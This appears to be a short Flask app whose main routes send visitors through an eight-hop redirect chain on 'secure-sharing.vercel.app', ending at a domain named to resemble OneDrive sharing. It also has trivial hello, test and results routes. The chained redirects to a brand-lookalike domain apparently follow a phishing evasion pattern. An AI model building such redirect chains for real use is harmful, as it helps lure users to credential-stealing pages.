from flask import Flask, request, render_template

app = Flask(__name__)

# Define redirection rules based on path
def get_redirect_url(path):
    if path == '/path1':
        return 'https://secure-sharing.vercel.app/path2'
    elif path == '/path2':
        return 'https://secure-sharing.vercel.app/path3'
    elif path == '/path3':
        return 'https://secure-sharing.vercel.app/path4'
    elif path == '/path4':
        return 'https://secure-sharing.vercel.app/path5'
    elif path == '/path5':
        return 'https://secure-sharing.vercel.app/path6'
    elif path == '/path6':
        return 'https://secure-sharing.vercel.app/path7'
    elif path == '/path7':
        return 'https://secure-sharing.vercel.app/path8'
    elif path == '/path8':
        return 'https://onedrive-sharing.vercel.app/'
    # Add more cases for additional paths and intermediary URLs as needed
    else:
        return 'https://onedrive-sharing.vercel.app/'

# Route to handle redirection for paths '/path1' to '/path8'
@app.route('/path<int:num>')
def path_handler(num):
    path = f'/path{num}'
    redirect_url = get_redirect_url(path)
    return render_template('redirect.html', redirect_url=redirect_url)

# Route for the main page
@app.route('/hello')
def hello():
    return 'Hello, world'

# Route for testing
@app.route('/test')
def test():
    return 'Test'

# Route for displaying results
@app.route('/result')
def result():
    scores = {'phy': 50, 'che': 60, 'maths': 70}
    return render_template('result.html', result=scores)

if __name__ == '__main__':
    app.run(debug=True)
